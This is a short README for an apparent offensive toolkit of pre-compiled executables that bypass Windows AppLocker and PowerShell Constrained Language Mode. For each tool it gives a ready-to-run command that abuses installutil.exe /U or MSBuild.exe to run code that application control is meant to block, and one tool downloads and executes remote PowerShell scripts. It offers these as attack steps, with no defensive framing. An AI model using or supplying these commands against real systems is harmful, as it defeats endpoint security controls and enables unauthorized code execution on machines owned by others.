# AppLocker & CLM Bypass Tools

Pre-compiled tools for bypassing AppLocker restrictions and PowerShell Constrained Language Mode (CLM).

## Tools

### PsBypassCLM.exe

Bypasses PowerShell Constrained Language Mode by launching a PowerShell runspace from an unmanaged context. Gives you a full-language mode PowerShell session.

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U PsBypassCLM.exe
```

### bypass-clm.exe

Minimal CLM bypass executable.

```
bypass-clm.exe
```

### POSHBypass.exe

Pre-compiled version of the `CSharp/POSHBypass` project. Downloads and executes PowerShell scripts via .NET runspace, bypassing CLM restrictions.

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U POSHBypass.exe
```

### esc.csproj

Evil SQL Client — a .NET SQL console client designed for execution via MSBuild. Useful when AppLocker blocks direct executable execution but allows MSBuild.

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe esc.csproj
```
